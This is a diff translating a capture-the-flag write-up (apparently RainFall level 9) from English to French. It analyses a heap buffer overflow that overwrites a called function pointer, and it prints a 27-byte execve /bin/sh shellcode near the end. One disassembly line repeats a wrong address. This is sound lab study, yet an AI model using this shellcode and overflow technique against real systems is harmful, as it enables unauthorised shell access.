@@ -1,6 +1,6 @@
-# Level 9
+# 09 - Heap buffer overflow 4
 
-- We login as user level9:
+- On se connecte en tant que level9:
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
@@ -100,36 +100,36 @@ Dump of assembler code for function _ZN1N13setAnnotationEPc:
 End of assembler dump.
 ```
 
-- Let's highlight the most important parts of the program:
+- Voyons les parties les plus importantes du programme:
 ```
    0x08048610 <+28>:    movl   $0x6c,(%esp)
    0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
    0x0804861c <+40>:    mov    %eax,%ebx
 ```
->Call `<_Znwj@plt>` with the constant 0x6c (108 in decimal) as the first parameter. This returns a 108-byte buffer allocated on the heap.
+> Appelle `<_Znwj@plt>` avec la constante 0x6c (108 en décimal) comme premier paramètre. Cela renvoie un tampon de 108 octets alloué sur la heap.
 
 ```
    0x08048626 <+50>:    mov    %ebx,(%esp)
    0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
    0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
 ```
->Call `<_ZN1NC2Ei>` with the new buffer. The buffer address will be copied at `0x1c(%esp)`.
+>Appelle `<_ZN1NC2Ei>` avec le nouveau buffer.
 
->The `<_ZN1NC2Ei>` function copies the address of a function at the beginning of the buffer passed as a parameter.
+> La fonction `<_ZN1NC2Ei>` copie l'adresse d'une fonction au début du buffer passé en paramètre.
 
 ```
    0x08048632 <+62>:    movl   $0x6c,(%esp)
    0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
    0x0804861c <+40>:    mov    %eax,%ebx
 ```
->Allocate another buffer on the heap.
+>Alloue un autre buffer de 108 octets sur la heap.
 
 ```
    0x08048648 <+84>:    mov    %ebx,(%esp)
    0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
    0x08048650 <+92>:    mov    %ebx,0x18(%esp)
 ```
->Call `<_ZN1NC2Ei>` with the new buffer. The buffer address will be copied at `0x18(%esp)`.
+>Appelle `<_ZN1NC2Ei>` avec le nouveau buffer.
 
 ```
    0x08048664 <+112>:   mov    0xc(%ebp),%eax
@@ -140,24 +140,21 @@ End of assembler dump.
    0x08048674 <+128>:   mov    %eax,(%esp)
    0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
 ```
->Call `<_ZN1N13setAnnotationEPc>` with the first argument of the program and the first buffer as parameters.
+>Appelle `<_ZN1N13setAnnotationEPc>` avec le premier argument du programme et le premier buffer comme paramètres.
 
->The `<_ZN1N13setAnnotationEPc>` function copy the first argument of the program into the buffer right after the address added by `<_ZN1NC2Ei>`.
+>La fonction `<_ZN1N13setAnnotationEPc>` copie le premier argument du programme dans le buffer juste après l'adresse ajoutée par `<_ZN1NC2Ei>`.
 
 ```
    0x0804867c <+136>:   mov    0x10(%esp),%eax
    0x08048680 <+140>:   mov    (%eax),%eax
    0x08048682 <+142>:   mov    (%eax),%edx
 ```
->Copy the address located inside the second buffer into `edx`.
-
 ```
    0x08048693 <+159>:   call   *%edx
 ```
->Call the function that starts at the address stored into `edx`.
+>Copie l'adresse située dans le deuxième buffer dans `edx`, puis call cette addresse.
 
-
-- Our only interaction with the program is the argument we give it as input. This argument is copied without limitation into a 108-byte buffer. Furthermore, the first 4 memory slots located just after the first buffer (those that make up the beginning of the second buffer) are used to store the address of a function that will be called `(0x08048693 <+159>: call *%edx)`, so:
+- Notre seule interaction avec le programme est l'argument que nous lui donnons en entrée. Cet argument est copié sans limitation dans un buffer de 108 octets. De plus, les 4 octets situés juste après le premier buffer (ceux qui constituent le début du deuxième tampon) sont utilisés pour stocker l'adresse d'une fonction qui sera appelée `(0x08048693 <+159>: call *%edx)`, du coup:
 ```
 $ echo -ne "\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80" | wc -c
 27
